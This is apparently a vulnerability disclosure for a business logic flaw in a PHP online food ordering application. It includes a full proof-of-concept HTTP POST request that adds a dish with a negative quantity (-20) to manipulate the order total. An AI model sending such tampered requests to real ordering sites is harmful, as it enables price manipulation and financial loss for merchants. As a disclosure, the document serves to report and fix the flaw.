# Business Logic in Online Food Ordering System

### Title: Business Logic in Online Food Ordering System
### CWE: Business Logic Errors

### Impact:
An attacker can manipulate product prices, potentially causing financial losses and negatively impacting revenue.

#### HTTP Request:
```
POST /OnlineFood-PHP/dishes.php?res_id=1&action=add&id=2 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/OnlineFood-PHP/dishes.php?res_id=1
Cookie: PHPSESSID=qr4c4tv56jj7l2j77ju7tpu9h8
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1


quantity=-20
```

### Proof with Screenshot:
![image](https://github.com/user-attachments/assets/24adf2fb-c4eb-497d-9684-2fdea2ff2ead)


## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
